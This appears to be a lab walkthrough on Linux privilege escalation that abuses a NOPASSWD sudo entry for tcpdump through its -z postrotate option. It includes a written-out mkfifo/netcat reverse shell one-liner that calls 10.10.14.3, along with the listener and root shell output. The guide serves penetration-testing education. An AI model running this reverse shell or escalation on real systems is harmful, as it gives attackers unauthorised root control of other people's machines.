# Sudo Rights Abuse

Check to see if the current user has any sudo privileges by typing sudo -l.

```bash
Attacker@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```
> Sometimes we will need to know the user's password to list their sudo rights, but any rights entries with the NOPASSWD option can be seen without entering a password.

Example: <br>
If the sudoers file is edited to grant a user the right to run a command such as tcpdump per the following entry in the sudoers file: (ALL) NOPASSWD: /usr/sbin/tcpdump an attacker could leverage this to take advantage of a the postrotate-command option.
```bash
Attacker@NIX02:~$ man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```
By specifying the -z flag, an attacker could use tcpdump to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script .test containing a reverse shell and execute it as follows:
```bash
Attacker@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
Let's try this out. First, make a file to execute with the postrotate-command, adding a simple reverse shell one-liner.


```bash
Attacker@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```
Next, start a netcat listener on our attacking box run tcpdump as root with the postrotate-command. If all goes to plan, we will receive a root reverse shell connection.
```bash
Attacker@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```
We receive a root shell almost instantly.
```bash
Attacker@xxx[/xxx]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

